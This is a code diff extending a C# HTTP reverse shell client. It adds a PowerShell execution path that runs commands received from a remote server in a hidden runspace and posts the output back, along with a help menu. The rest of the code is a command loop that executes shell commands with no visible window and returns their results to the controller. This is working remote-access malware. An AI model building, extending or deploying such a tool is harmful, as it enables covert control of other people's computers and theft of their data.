@@ -6,6 +6,7 @@ using System.Text.RegularExpressions;
 using System.Diagnostics;
 using System.Management.Automation;
 using System.Collections.ObjectModel;
+using System.Management.Automation.Runspaces;
 
 namespace HTTPRevShell_Client
 {
@@ -24,9 +25,18 @@ namespace HTTPRevShell_Client
                 {
                     break;
                 }
+                if (cmd == "help")
+                {
+                    Post(url, PrintHelp());
+                }
                 else if (cmd.StartsWith("cd ")) 
                 {
                     location = ChangeLocation(cmd, location, url);
+                }
+                else if (cmd.StartsWith("powershell "))
+                {
+                    string output = RunPSH(cmd);
+                    Post(url, output.ToString());
                 }
                 else
                 {
@@ -39,12 +49,32 @@ namespace HTTPRevShell_Client
             }
         }
 
+        public static string RunPSH(string cmd)
+        {
+            cmd = cmd.Substring(11);
+
+            Runspace runspace = RunspaceFactory.CreateRunspace();
+            runspace.Open();
+            Pipeline pipeline = runspace.CreatePipeline();
+            pipeline.Commands.AddScript(cmd);
+            pipeline.Commands.Add("Out-String");
+
+            StringBuilder output = new StringBuilder();
+
+            foreach (PSObject obj in pipeline.Invoke())
+            {
+                output.AppendLine(obj.ToString());
+            }
+
+            runspace.Close();
+            return output.ToString();
+        }
+
         // Run CMD Command
         public static (string, string) RunCMD(string cmd, string location)
         {
             Process process = new Process();
             process.StartInfo.FileName = "cmd.exe";
-            process.StartInfo.RedirectStandardInput = true;
             process.StartInfo.RedirectStandardOutput = true;
             process.StartInfo.RedirectStandardError = true;
             process.StartInfo.CreateNoWindow = true;
@@ -150,6 +180,15 @@ namespace HTTPRevShell_Client
             {
                 return reader.ReadToEnd();
             }
+        }
+
+        // Help Output
+        public static string PrintHelp()
+        {
+            return "!#!\n  Spaghetti Overdose\n" +
+                " -----------------------------------------\n" +
+                "   help        Print this message\n" +
+                "   terminate   Close the client connection\n";
         }
     }
 }
